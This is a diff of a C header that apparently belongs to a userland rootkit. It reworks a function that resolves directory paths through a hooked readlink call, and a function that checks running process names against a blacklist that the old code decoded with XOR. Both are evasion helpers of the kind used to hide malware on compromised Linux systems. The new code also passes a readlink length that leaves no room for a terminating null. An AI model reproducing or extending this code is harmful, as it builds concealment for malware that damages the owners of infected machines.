@@ -1,31 +1,25 @@
 #ifndef DIR_H
 #define DIR_H
 
-char *gdirname(DIR *dirp)
-{
+char *gdirname(DIR *dirp){
     int fd = dirfd(dirp);
     char path[PATH_MAX], *filename = (char *)malloc(PATH_MAX);
     memset(filename, 0, PATH_MAX);
 
-    (void)snprintf(path, sizeof(path) - 1, "/proc/self/fd/%d", fd);
+    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
 
     hook(CREADLINK);
-    if((long)call(CREADLINK, path, filename, sizeof(path) - 1) < 0) return NULL;
+    if((long)call(CREADLINK, path, filename, sizeof(path)) < 0) return NULL;
     return filename;
 }
 
-int is_blacklisted(const char *process)
-{
+int is_blacklisted(const char *process){
     int r = 0;
-    for(int i = 0; process_blacklist[i] != NULL; i++)
-    {
-        xor(process_name, process_blacklist[i]);
-        if(!strcmp(process_name, process_blacklist[i]))
-        {
+    for(int i = 0; i < PROCESS_BLACKLIST_SIZE; i++){
+        if(!strncmp(process, process_blacklist[i], strlen(process_blacklist[i]))){
             r = 1;
             break;
         }
-        clean(process_name);
     }
     return r;
 }
